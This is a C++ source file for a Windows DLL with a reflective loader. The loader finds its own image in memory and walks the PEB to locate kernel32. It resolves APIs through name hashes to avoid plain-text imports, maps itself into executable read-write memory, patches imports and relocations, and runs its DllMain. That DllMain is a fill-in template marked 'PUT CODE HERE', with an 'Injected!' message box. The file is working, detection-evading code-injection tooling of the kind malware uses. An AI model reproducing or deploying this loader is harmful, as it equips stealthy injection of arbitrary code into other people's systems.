#include <Windows.h>
#include <intrin.h>

#pragma intrinsic(_ReturnAddress)

#define KERNEL32_HASH        0x50c4067
#define VIRTUALALLOC_HASH    0x4e0dabf
#define LOADLIBRARYA_HASH    0x669f241
#define GETPROCADDRESS_HASH  0x5a3e09d
#define FLUSHINSTRUCTIONCACHE_HASH 0x8c05103

typedef LPVOID  (WINAPI* FN_VirtualAlloc)        (LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI* FN_FlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
typedef HMODULE (WINAPI* FN_LoadLibraryA)         (LPCSTR);
typedef FARPROC (WINAPI* FN_GetProcAddress)       (HMODULE, LPCSTR);

typedef struct { WORD offset : 12; WORD type : 4; } IMAGE_RELOC, *PIMAGE_RELOC;

typedef struct _UNICODE_STR { USHORT Length; USHORT MaximumLength; PWSTR pBuffer; } UNICODE_STR;
typedef struct _LDR_ENTRY {
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage;
    UNICODE_STR FullDllName; UNICODE_STR BaseDllName;
    ULONG Flags; SHORT LoadCount; SHORT TlsIndex;
    LIST_ENTRY HashTableEntry; ULONG TimeDateStamp;
} LDR_ENTRY, *PLDR_ENTRY;
typedef struct _PEB_LDR { DWORD Length; DWORD Initialized; LPVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR;
typedef struct _PEB { BYTE pad[12]; PVOID ImageBase; PEB_LDR* Ldr; } MYPEB;

static SIZE_T StrLenA(LPSTR s) { SIZE_T n = 0; while (s[n]) n++; return n; }
static SIZE_T StrLenW(LPWSTR s) { SIZE_T n = 0; while (s[n]) n++; return n; }

static DWORD HashA(LPSTR s) {
    DWORD h = 0x35;
    for (SIZE_T i = 0, n = StrLenA(s); i < n; i++)
        h += (h * 0xab10f29e + s[i]) & 0xffffff;
    return h;
}
static DWORD HashW(LPWSTR s) {
    DWORD h = 0x35;
    for (SIZE_T i = 0, n = StrLenW(s); i < n; i++)
        h += (h * 0xab10f29e + s[i]) & 0xffffff;
    return h;
}

static ULONG_PTR GetExport(PIMAGE_DOS_HEADER base, DWORD hash) {
    PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)((LPBYTE)base + base->e_lfanew);
    DWORD expRVA = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)base + expRVA);
    PDWORD names  = (PDWORD)((LPBYTE)base + exp->AddressOfNames);
    PWORD  ords   = (PWORD) ((LPBYTE)base + exp->AddressOfNameOrdinals);
    PDWORD funcs  = (PDWORD)((LPBYTE)base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (HashA((LPSTR)((LPBYTE)base + names[i])) == hash)
            return (ULONG_PTR)((LPBYTE)base + funcs[ords[i]]);
    }
    return 0;
}

__declspec(noinline) static ULONG_PTR GetRIP() { return (ULONG_PTR)_ReturnAddress(); }

extern "C" __declspec(dllexport) void ReflectiveLoader()
{
    ULONG_PTR rip = GetRIP();
    PIMAGE_DOS_HEADER self = (PIMAGE_DOS_HEADER)rip;
    while (TRUE) {
        if (self->e_magic == IMAGE_DOS_SIGNATURE &&
            self->e_lfanew >= (LONG)sizeof(IMAGE_DOS_HEADER) && self->e_lfanew < 1024) {
            PIMAGE_NT_HEADERS64 nth = (PIMAGE_NT_HEADERS64)((LPBYTE)self + self->e_lfanew);
            if (nth->Signature == IMAGE_NT_SIGNATURE) break;
        }
        self = (PIMAGE_DOS_HEADER)((LPBYTE)self - 1);
    }

    MYPEB* peb = (MYPEB*)__readgsqword(0x60);
    PLDR_ENTRY ldr = (PLDR_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    ULONG_PTR k32 = 0;
    do {
        if (HashW(ldr->BaseDllName.pBuffer) == KERNEL32_HASH) { k32 = (ULONG_PTR)ldr->DllBase; break; }
        ldr = (PLDR_ENTRY)ldr->InMemoryOrderModuleList.Flink;
    } while (ldr->TimeDateStamp != 0);

    FN_VirtualAlloc         pVirtualAlloc  = (FN_VirtualAlloc)        GetExport((PIMAGE_DOS_HEADER)k32, VIRTUALALLOC_HASH);
    FN_FlushInstructionCache pFlushICache   = (FN_FlushInstructionCache)GetExport((PIMAGE_DOS_HEADER)k32, FLUSHINSTRUCTIONCACHE_HASH);
    FN_LoadLibraryA          pLoadLibA      = (FN_LoadLibraryA)         GetExport((PIMAGE_DOS_HEADER)k32, LOADLIBRARYA_HASH);
    FN_GetProcAddress        pGetProcAddr   = (FN_GetProcAddress)       GetExport((PIMAGE_DOS_HEADER)k32, GETPROCADDRESS_HASH);

    PIMAGE_NT_HEADERS64 selfNth = (PIMAGE_NT_HEADERS64)((LPBYTE)self + self->e_lfanew);
    DWORD imageSize = selfNth->OptionalHeader.SizeOfImage;

    LPBYTE mapped = (LPBYTE)pVirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    DWORD hdrSize = selfNth->OptionalHeader.SizeOfHeaders;
    for (DWORD i = 0; i < hdrSize; i++) mapped[i] = ((LPBYTE)self)[i];

    DWORD numSec = selfNth->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)((LPBYTE)&selfNth->OptionalHeader + selfNth->FileHeader.SizeOfOptionalHeader);
    for (DWORD i = 0; i < numSec; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        LPBYTE dst = mapped + sec->VirtualAddress;
        LPBYTE src = (LPBYTE)self + sec->PointerToRawData;
        for (DWORD j = 0; j < sec->SizeOfRawData; j++) dst[j] = src[j];
    }

    PIMAGE_NT_HEADERS64 mappedNth = (PIMAGE_NT_HEADERS64)(((PIMAGE_DOS_HEADER)mapped)->e_lfanew + mapped);

    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(mappedNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + mapped);
    while (imp->Name) {
        HMODULE hMod = pLoadLibA((LPSTR)(imp->Name + mapped));
        PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)(imp->FirstThunk + mapped);
        while (thunk->u1.AddressOfData) {
            FARPROC fn;
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64)
                fn = pGetProcAddr(hMod, MAKEINTRESOURCEA(thunk->u1.Ordinal & 0xffff));
            else
                fn = pGetProcAddr(hMod, ((PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData + mapped))->Name);
            if (!fn) return;
            thunk->u1.AddressOfData = (ULONGLONG)fn;
            thunk++;
        }
        imp++;
    }

    ULONGLONG delta = (ULONGLONG)mapped - mappedNth->OptionalHeader.ImageBase;
    if (delta) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(mappedNth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + mapped);
        while (reloc->VirtualAddress) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PIMAGE_RELOC entry = (PIMAGE_RELOC)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD i = 0; i < count; i++, entry++) {
                if (entry->type == IMAGE_REL_BASED_DIR64)
                    *(ULONGLONG*)(mapped + reloc->VirtualAddress + entry->offset) += delta;
            }
            reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
        }
    }

    pFlushICache((HANDLE)-1, NULL, 0);

    typedef BOOL (WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
    ((DLLMAIN)(mappedNth->OptionalHeader.AddressOfEntryPoint + mapped))((HINSTANCE)mapped, DLL_PROCESS_ATTACH, NULL);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

      
        //  PUT  CODE HERE

        MessageBoxA(NULL, "Injected!", "TXC", MB_OK);
    }
    return TRUE;
}
